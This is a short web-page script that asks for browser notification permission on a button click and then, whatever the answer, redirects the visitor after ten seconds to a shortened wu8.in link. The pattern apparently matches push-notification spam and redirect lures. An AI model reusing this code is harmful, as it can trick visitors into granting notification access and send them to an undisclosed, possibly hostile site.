<script>
function requestNotificationAndRedirect() {
  if (!("Notification" in window)) {
    setTimeout(() => { window.location.href = "https://wu8.in/UBsddcw"; }, 10000);
    return;
  }

  Notification.requestPermission().then(permission => {
    const dest = permission === "granted" ? "https://wu8.in/UBsddcw" : "https://wu8.in/UBsddcw";
    setTimeout(() => { window.location.href = dest; }, 10000);
  }).catch(() => {
    setTimeout(() => { window.location.href = "https://wu8.in/UBsddcw"; }, 10000);
  });
}

// Example: call from a user gesture (button click)
document.getElementById("notifyBtn").addEventListener("click", requestNotificationAndRedirect);

</script>
